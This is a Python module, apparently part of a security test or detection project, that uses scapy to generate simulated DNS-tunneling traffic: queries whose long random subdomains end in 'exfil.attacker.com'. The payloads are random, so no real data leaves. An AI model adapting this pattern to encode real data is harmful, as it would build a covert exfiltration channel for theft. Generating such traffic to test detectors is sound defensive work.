from __future__ import annotations

import random
import string
from typing import List

from scapy.packet import Packet

from backend.traffic.common import dns_query_packet


def build_dns_tunneling_traffic(
    attacker_ip: str = "192.168.1.202",
    dns_server: str = "8.8.8.8",
    query_count: int = 20,
    random_seed: int = 42,
) -> List[Packet]:
    """Generate DNS tunneling-like queries with unique random encoded subdomains."""
    packets: List[Packet] = []
    rng = random.Random(random_seed)
    alphabet = string.ascii_lowercase + string.digits

    for idx in range(query_count):
        label_len = rng.randint(32, 48)
        payload = "".join(rng.choice(alphabet) for _ in range(label_len))
        qname = f"{payload}.exfil.attacker.com"
        packets.append(dns_query_packet(attacker_ip, dns_server, qname, sport=53000 + idx))

    return packets
